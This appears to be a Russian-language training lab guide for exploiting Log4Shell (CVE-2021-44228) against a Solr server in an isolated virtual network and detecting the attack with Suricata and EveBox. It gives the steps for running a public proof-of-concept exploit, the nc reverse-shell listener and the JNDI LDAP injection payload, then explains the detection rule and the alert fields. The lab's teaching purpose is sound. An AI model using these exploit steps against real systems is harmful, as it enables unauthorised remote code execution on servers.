# Guided Case 2.18 — Log4Shell

> [!info] Путь в курсе
> Глава 2: Сети и сетевая безопасность / Часть 3. Кибератаки и защита от них / Эксплуатация уязвимостей

## Стенд / введение

Создадим виртуальную инфраструктуру в соответствии с схемой ниже:

![](../../_images/87ec1226d727.webp)

Первая сеть **192.168.1.0/24**, которая состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether1**:
   
   - IP-адрес - 192.168.1.1
   - Маска - 255.255.255.0
2. **Debian-машина** с **GUI** и интерфейсом **enp0s3**. Установка виртуальной машины аналогична статье **Установка Debian 12 **из Главы 1, только при создании требуется загрузить графический интерфейс.
   
   - IP-адрес - 192.168.1.252
   - Маска - 255.255.255.0
   - Сетевой шлюз - 192.168.1.1

Вторая сеть **192.168.2.0/24** состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether2**:
   
   - IP-адрес - 192.168.2.1
   - Маска - 255.255.255.0
2. **Victim1** с интерфейсом **enp0s3**:
   
   - IP-адрес - назначается по DHCP
   - Маска - назначается по DHCP
   - Сетевой шлюз - 192.168.2.1

Третья сеть **10.0.0.0/8** состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether3**:
   
   - IP-адрес - 10.0.0.1
   - Маска - 255.0.0.0
2. **Suricata** с интерфейсом **enp0s3**:
   
   - IP-адрес - 10.255.255.254
   - Маска - 255.0.0.0
   - Сетевой шлюз - 10.0.0.1

Для выполнения данного кейса необходимо скачать **OVA-образ** виртуальной машины **Victim1**, заготовленный Positive Technologies, скачать его можно по [**данной ссылке**](https://storage.ptsecurity.com/seafhttp/f/90343755c5384ba7bfa2/?op=view). **Victim1** уже настроен, требуется только подключить с правильными сетевыми параметрами

> У виртуальных машин должно быть по 1 сетевому адаптеру VirtualBox в режиме **Internal Network**

Для работы развернем виртуальную машину **MikroTik.ova**. Назначим IP нашим интерфейсам на маршрутизаторе.

1. `ip address add address=192.168.1.1/24 interface=ether1`
2. `ip address add address=192.168.2.1/24 interface=ether2`
3. `ip address add address=10.0.0.1/8 interface=ether3`

Запустим интерактивный мастер по настройке DHCP с помощью команды `ip dhcp-server setup` и выберем второй интерфейс. Затем выполним следующее:

1. `tool sniffer set streaming-enabled=yes streaming-server=10.255.255.254` - для зеркалирования трафика на машину с suricata
2. `tool sniffer set filter-interface=ether1,ether2` - указываем с каких интерфейсов мы считываем весь трафик
3. `tool sniffer start` - запускаем режим зеркалирования

Теперь настроим сервер **Suricata** для детектирования сетевых атак:

1. `sudo apt install -y git gcc libpcap-dev make tcpreplay` - подготовка среды для установки утилиты по деинкапсуляции пакетов
2. `git clone https://github.com/thefloweringash/tzsp2pcap.git && cd tzsp2pcap` - установка утилиты **TZSP** для деинкапсуляции приходящих пакетов от MikroTik
3. `make && sudo cp tzsp2pcap /usr/local/bin/` - компиляция файла и перенос его в директорию bin
4. `sudo bash -c 'echo "dummy" > /etc/modules-load.d/dummy.conf' && sudo modprobe dummy` - создание виртуального интерфейса dummy для обработки пакетов

В файл **/etc/systemd/network/99-dummy.netdev** запишем следующее

```
[NetDev]
Name=dummy0
Kind=dummy
```

В файл **/etc/systemd/network/99-dummy.network** запишем

```
[Match]
Name=dummy0

[Link]
Unmanaged=yes
ActivationPolicy=up

[Network]
DHCP=no
LinkLocalAddressing=no
```

Включим и запустим systemd-networkd с помощью команды `sudo systemctl enable systemd-networkd && sudo systemctl restart systemd-networkd`

Создадим сервис для автозапуска утилиты **TZSP** по пути **/etc/systemd/system/tzsp-replay.service**

```
[Unit]
Description=TZSP Replay on dev dummy0
After=network.target network-online.target systemd-networkd.service
Requires=network-online.target
Wants=systemd-networkd.service

[Service]
Type=simple
ExecStartPre=/bin/sh -c 'while ! ip link show dummy0 >/dev/null 2>&1; do sleep 1; done'
ExecStart=/bin/sh -c "/usr/local/bin/tzsp2pcap -f | /usr/bin/tcpreplay --intf1=dummy0 --topspeed -"
Restart=always
RestartSec=3
ProtectSystem=full
ProtectHome=true

[Install]
WantedBy=multi-user.target
```

Для установки **suricata** воспользуемся командами:

1. `echo "deb http://deb.debian.org/debian bookworm-backports main" | sudo tee /etc/apt/sources.list.d/backports.list > /dev/null && sudo apt update`
2. `apt install -t bookworm-backports suricata`

При установке Suricata должна автоматически создаться одноимённая системная группа. На случай, если группа не была создана, выполним команду: `sudo groupadd --system --force suricata`

Затем добавим пользователя **EveBox **в группу **suricata**: `sudo usermod -aG suricata evebox`

Зайдем в файл конфигурации Suricata **/etc/suricata/suricata.yaml** и заменим прослушиваемый интерфейс на **dummy0** в разделе **af-packet**.

![](../../_images/80cf7695887c.webp)

В этом же файле добавим конфигурацию под файл для открытых правил [**PT Rules**](https://rules.ptsecurity.com/view/ptopen-all.rules).

![](../../_images/d84160f88ad5.webp)

Затем скачаем данные правила и запишем их в файл **/var/lib/suricata/rules/PT.rules**.

`sudo curl -fsSL -A "Mozilla/5.0" "https://storage.ptsecurity.com/seafhttp/f/e7973407d07d49669391/?op=download" -o /var/lib/suricata/rules/PT.rules`

Затем выполним оставшиеся команды для финального запуска:

1. `sudo systemctl daemon-reload && sudo systemctl enable tzsp-replay.service && sudo systemctl start tzsp-replay.service` - активируем сервисы
2. `sudo systemctl restart suricata` - перезапуск сервиса сурикаты, после изменения интерфейса

Также развернем для удобства графический интерфейс **EveBox**, для этого выполним следующие команды:

1. `curl -fsSL https://evebox.org/files/evebox.asc | sudo tee /etc/apt/keyrings/evebox.asc > /dev/null` - установка и сохранение ключа
2. `echo "deb [signed-by=/etc/apt/keyrings/evebox.asc] https://evebox.org/files/debian stable main" | sudo tee /etc/apt/sources.list.d/evebox.list` - добавление репозитория EveBox
3. `sudo apt-get update` - обновление списка пакетов
4. `sudo apt-get install -y evebox` - установка EveBox
5. `sudo usermod -a -G suricata evebox` - добавление EveBox в группу suricata
6. `sudo mkdir -p /etc/systemd/system/evebox.service.d` - создаем каталог для предопределения

Затем запишем в файл **/etc/systemd/system/evebox.service.d/override.conf**

```
[Service]
ExecStart=
ExecStart=/usr/bin/evebox server --datastore sqlite --input /var/log/suricata/eve.json --host 0.0.0.0 --tls false
```

Затем перезапустим сервис, чтобы правила принялись:

1. `sudo systemctl daemon-reload` - перезапуск демонов
2. `sudo systemctl restart evebox` - перезапуск ExeBox
3. `sudo journalctl -u evebox | grep -i "created administrator"` - узнаем логин и пароль от сервиса, в дальнейшем он пригодится для входа через браузер

На атакующей машине зайдем в веб-приложение, введя в адресной строке браузера **https://10.255.255.254:5636**, где:

- **10.255.255.254** - сервер на котором расположена suricata
- **5636** - порт, на котором расположен EveBox

После ввода произойдет переброс на **https://10.255.255.254:5636/#login?redirectTo=%2F%3F**

![](../../_images/1f73f78d5aee.webp)

Как видно, веб-приложение запущено и нас ожидает стандартный вход по логину и паролю.

После настройки виртуальных машин просканируем подсеть командой `sudo nmap 192.168.2.0/24` чтобы понять, на каком IP-адресе находится уязвимый сервер.

![](../../_images/c5b7266782a7.webp)

Мы можем увидеть два узла:

1. Маршрутизатор (**192.168.2.1**)
2. Victim-машина (**192.168.2.254**) с открытыми портами **22** (**ssh**) и **80** (**http**)

Зайдем на порт 80 машины жертвы.

![](../../_images/d576dc859e5c.webp)

Можем заметить, что данное веб-приложение **Solr** - это платформа, основанная на проекте **Apache Lucene**, который является библиотекой написанной на Java. Также видим, что используется **OpenJDK 1.8.0** - значит бэкэнд сайта написан на **Java 8**. Продолжим изучать другие вкладки веб-приложения.

![](../../_images/070e0c41e5a7.webp)

Перейдя во вкладку Logging видим, что используется библиотека для журналирования **Log4j2**, возникает вопрос - а не было ли с ней связано никаких уязвимостей. Проверить догадку можно на [**dbugs**](https://dbugs.ptsecurity.com/).

> **dbugs** - онлайн‑портал с интерактивной базой знаний уязвимостей для изучения, демонстрации и отслеживания известных проблем безопасности в программном обеспечение и веб‑приложениях.

![](../../_images/92b3fd236182.webp)

Для поиска информации по конкретной уязвимости воспользуемся поисковиком на данном портале:

- поиск можно сделать сразу в разделе по умолчанию - раздел **Home**
- можем перейти в раздел **Vulnerabilities** и воспользуемся детальным поисковиком

![](../../_images/75361ce97581.webp)

К примеру, впишем в поисковик следующий идентификатор уязвимости - **CVE-2023-45853**. Обратим внимание, что по умолчанию формат описания выбран **OSV**. Это поле фильтрации, где можно выбрать формат описания уязвимости из различных баз данных, таких как BDU, OSV, NVD, Mitre и других.

> **OSV** - глобальная база данных и открытый стандарт для описания уязвимостей в программном обеспечении с открытым исходным кодом

![](../../_images/30fcc46a651c.webp)

В этом поле необходимо выбрать **Positive Technologies**, так как эта база данных собирает максимально подробную и полную информацию о различных уязвимостях.

![](../../_images/82c1cc6bcee7.webp)

В открывшейся карточке уязвимости мы можем увидеть:

- идентификатор уязвимости от Positive Technologies
- исследователя безопасности
- дату публикации уязвимости
- дату обновления информации об уязвимости
- оценку уязвимости по CVSS
- детальное описание
- рекомендации по устранению уязвимости
- различные полезные ссылки, связанные с данной уязвимостью (ссылки на эксплойт/эксплойты, различные заметки по уязвимости; ссылки на сторонние базы уязвимостей и сайты вендоров)

Теперь перейдем к поиску информации про возможные уязвимости **Log4j2**.

![](../../_images/6acd5b259877.webp)

По запросу выдало множество уязвимостей, связанных с Log4j2, рассмотрим **PT-2021-5169**, так как он оценивается на 10 по шкале **CVSSv3**

> **CVSS** - это открытый международный стандарт для оценки и классификации уязвимостей в сфере информационной безопасности

![](../../_images/e37bb24f35cd.webp)

В открывшейся карточке самое интересное для нас - это эксплойты, которые предоставлены в блоке **References**.

![](../../_images/ed44b0beb780.webp)

Воспользуемся любым эксплойтом, к примеру [**https://github.com/kozmer/log4j-shell-poc**](https://github.com/kozmer/log4j-shell-poc)

На машине атакующего выполним следующий набор действий:

![](../../_images/c8154bb210cf.webp)
1. `wget https://raw.githubusercontent.com/kozmer/log4j-shell-poc/refs/heads/main/poc.py` - установка готового эксплойта на python
2. `pip install argparse --break-system-packages` - установка библиотеки argparse для работы с переданными аргументами из командной строки
3. `mkdir -p target` - создание папки с названием target
4. `wget -O target/marshalsec-0.0.3-SNAPSHOT-all.jar https://github.com/RandomRobbieBF/marshalsec-jar/raw/refs/heads/master/marshalsec-0.0.3-SNAPSHOT-all.jar` - установка marshalsec в target/marshalsec-0.0.3-SNAPSHOT-all.jar. Marshalsec нужен для быстрого поднятия LDAP сервера, он будет перенаправлять на наш уязвимый java файл.
5. `wget -O jdk-8u20-linux-x64.tar.gz 'https://storage.ptsecurity.com/seafhttp/f/8ed497b46d204767bf2a/?op=view'` - установка файла jdk для компилирования уязвимого java файла
6. `tar -xvzf jdk-8u20-linux-x64.tar.gz && mv jdk1.8.0_20 ~/jdk1.8.0_20` - разархивирование jdk архива и перенос его домашнюю директорию пользователя
7. `python3 poc.py --userip 192.168.1.252 --webport 80 --lport 9000` - запуск эксплойта с параметрами нашего ip, вебпорта ресурса и порта для обратного подключения сервера к нашей системе

![](../../_images/99d9a1ae3f7e.webp)

Затем включим прослушивание порта командой `nc -lvnp 9000`, чтобы поймать запрос от сервера на 9000 порт.

Теперь нам нужно как-то передать полезную нагрузку на сервис, для этого нужно найти форму. В **Core Selector** выбираем активное ядро поискового индекса - **demo**, затем в выпадающем меню переходим на вкладку **Query**, где увидим строку **Raw Query Parameters**. В **Raw Query Parameters** вставляем полезную нагрузку `${jndi:ldap://192.168.1.252:1389/a}` и отправляем.

![](../../_images/2afe58eccf97.webp)

После этого мы получаем **reverse-shell**.

> **Reverse-shell** - это метод удаленного управления компьютером, при котором атакуемая машина сама инициирует сетевое подключение к машине атакующего и передает ему доступ к своему командному интерфейсу.

После появления информации о том, что произошел коннект, обязательно проверим что мы находимся в системе. Для этого используем команду **pwd** и **id**, они нам покажут местоположение в системе и какими правами мы обладаем.

![](../../_images/2ccb62365291.webp)

Посмотрим на логи в EveBox, которые появились в записях во время атаки.

Правилами мы задетектировали полезную нагрузку по триггеру **${**. Suricata ищет первые два символа, если их нет пакет пропускается, если они есть включается цепочка относительных проверок. Относительный поиск сработает только если в пакете в чистом виде написана последовательность **${jndi**. Откроем карточку инцидента нажав на детектирование.

![](../../_images/108a3fc8dce9.webp)

Рассмотрим основные поля:

- **Timestamp** - время детектирования атаки
- **Protocol** - тип протокола в котором была проведена атака
- **Source** - атакующая машина
- **Destination** - сервер жертва
- **In interface** - интерфейс на котором была задетектирована атака
- **Flow ID** - уникальный цифровой номер присвоенный Suricata
- **Signature** - название правила обнаружения с кратким описанием сути уязвимости и её CVE-идентификатором
- **Category** - класс атаки, определяющий намерения атакующего
- **Severity** - уровень критичности инцидента, где 1 - максимальная опасность
- **Signature ID** - уникальный числовой идентификатор конкретной сигнатуры в базе правил Suricata
- **Generator ID** - идентификатор компонента системы, который сгенерировал alert. 1 означает, что сработали стандартные правила фильтрации трафика
- **Revision** - порядковый номер редакции правила
- **bytes_toclient** - объем данных в байтах, отправленный от сервера обратно атакующей машине
- **bytes_toserver** - объем данных в байтах, отправленный атакующей машиной на целевой сервер
- **dest_ip** - адрес атакуемого сервера-жертвы
- **dest_port** - сетевой порт на сервере, куда был направлен запрос
- **pkts_toclient** - количество сетевых пакетов, переданных от сервера обратно атакующей машине
- **pkts_toserver** - количество сетевых пакетов, отправленных атакующей машиной на целевой сервер
- **src_ip** - адрес атакующей машины, с которой исходил запрос
- **src_port** - исходящий сетевой порт, открытый на атакующей машине для этого соединения
- **start** - точное время и дата начала сессии в формате UTC
- **agent.filename** - абсолютный путь к лог-файлу Suricata на сервере, из которого система EveBox прочитала данные о событии
- **action** - действие, предпринятое системой защиты
- **category** - тип или класс выявленной сетевой угрозы
- **gid** - числовой идентификатор компонента зафиксировавшего событие
- **rev** - порядковый номер версии или редакции сработавшего правила
- **hostname** - доменное имя или адрес веб-сервера
- **http_method** - тип операции, использованный при отправке веб-запроса
- **http_refer** - адрес веб-страницы, с которой пользователь совершил переход на текущий ресурс
- **http_user_agent** - идентификационные данные программного обеспечения и ОС атакующего устройства
- **length** - размер переданного тела HTTP-запроса в байтах
- **protocol** - используемая версия сетевого протокола передачи гипертекста
- **url** - полный путь веб-запроса, содержащий внутри себя вредоносную строку.

Рассмотрев инцидент подробно понимаем, что атакующий пытался получить удаленный контроль над сервером через уязвимость Log4Shell. При декодирование строки из поля url видим, что скрытый payload находился в запросе: **${jndi:ldap://192.168.1.252:1389/...}**. Атакующий заставил сервер-жертву через библиотеку Log4j выполнить команду JNDI и принудительно обратиться по протоколу LDAP к подконтрольному хосту 192.168.1.252 на порт 1389, а так как система стояла только на предупреждение, она установила файл и дала доступ к системе.
